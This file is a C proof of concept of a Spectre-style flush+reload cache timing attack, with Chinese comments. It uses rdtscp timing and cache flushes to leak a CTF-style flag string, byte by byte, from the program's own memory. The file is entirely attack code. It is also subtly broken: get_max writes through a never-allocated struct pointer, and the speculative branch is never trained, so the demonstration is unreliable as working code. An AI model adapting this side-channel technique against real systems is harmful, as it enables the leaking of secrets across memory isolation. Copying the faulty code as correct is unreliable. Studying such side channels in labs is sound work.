#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>
#include <stdio.h>

#define PAGE_NUM 256
#define PAGE_SIZE 4096
#define TRYS 50000
#define TIME_LIMIT 150
//#define DEBUG

char *target = "flxg:{Deep Dark Fantasy}";

char PAGES[PAGE_NUM * PAGE_SIZE];
int cache_hit_times[PAGE_NUM];

struct info {
    int max_1_num;
    float max_1_sure;
    int max_2_num;
    float max_2_sure;
};

// 利用cpu方法__rdtscp进行精确计时
static inline int get_access_delay(volatile char *addr) {

    unsigned long long start, end;

    unsigned none;

    start = __rdtscp(&none);

    (void) *addr;

    end = __rdtscp(&none);

    return end - start;

}

void move_in_cache(char *adr) {
    static int cursor = -1;
    // 强制将cursor移除cache
    _mm_clflush(&cursor);
    // 执行之后被撤销但仍然在cache中
    if (cursor > 0) {
        int tmp = PAGES[*adr * PAGE_SIZE];
    }
}

void extract_item(char *adr) {
    memset(cache_hit_times, 0, sizeof(cache_hit_times));
    for (int try = 0; try < TRYS; try++) {
        // 强制将一页移除cache
        for (int i = 0; i < PAGE_NUM; i++) {
            _mm_clflush(&PAGES[i * PAGE_SIZE]);
        }
        // adr移入cache
        move_in_cache(adr);
        // 依次访问每个page并打乱顺序防止预读
        for (int i = 0; i < PAGE_NUM; i++) {

            int mix_i = ((i * 37) + 13) & 255;
            if (mix_i > 0 && mix_i < 17) {
                continue;
            }

            if (get_access_delay(&PAGES[mix_i * PAGE_SIZE]) <= TIME_LIMIT)

                cache_hit_times[mix_i]++;

        }

    }

}

struct info *get_max() {
    int max = -1, max_2 = -1, index_of_max = -1, index_of_max_2 = -1, sum = 0;
    struct info *one;
    for (int i = 0; i < PAGE_NUM; i++) {
        sum += cache_hit_times[i];

        if (cache_hit_times[i] && cache_hit_times[i] > max) {
            max_2 = max;
            max = cache_hit_times[i];
            index_of_max_2 = index_of_max;

            index_of_max = i;
        } else if (cache_hit_times[i] && cache_hit_times[i] > max_2) {
            max_2 = cache_hit_times[i];
            index_of_max_2 = i;
        }
        one->max_1_num = index_of_max;
        one->max_2_num = index_of_max_2;
        one->max_1_sure = (float) max / (float) sum;
        one->max_2_sure = (float) max_2 / (float) sum;
    }
    return one;
}

int main(void) {
    for (int i = 0; i < sizeof(PAGES); i++) {
        PAGES[i] = 1;
    }

    char *address = target;
    char result[100];
    int len = strlen(address);
    int i = 0;
    for (i = 0; i < len; i++) {
        extract_item(address + i);
        struct info *one = get_max();
        result[i] = one->max_1_num;
#ifdef DEBUG
        printf("Most possible at %c, %d hits / %.2f\tSecond possible at %c, %d hits / %.2f\t",
               one->max_1_num, cache_hit_times[one->max_1_num], one->max_1_sure,
               one->max_2_num, cache_hit_times[one->max_2_num], one->max_2_sure);
        // 提示二义性
        if (one->max_2_sure > 0.05f) {
            printf("There may be ambiguity for [%c] and [%c] at %d\n", one->max_1_num, one->max_2_num, i);
        } else {
            printf("\n");
        }

#else
        // 提示二义性
        if (one->max_2_sure > 0.05f) {
            printf("There may be ambiguity for [%c] and [%c] at %d\n", one->max_1_num, one->max_2_num, i);
        }
#endif
    }
    result[i] = '\0';
    printf("get answer : %s", result);

}
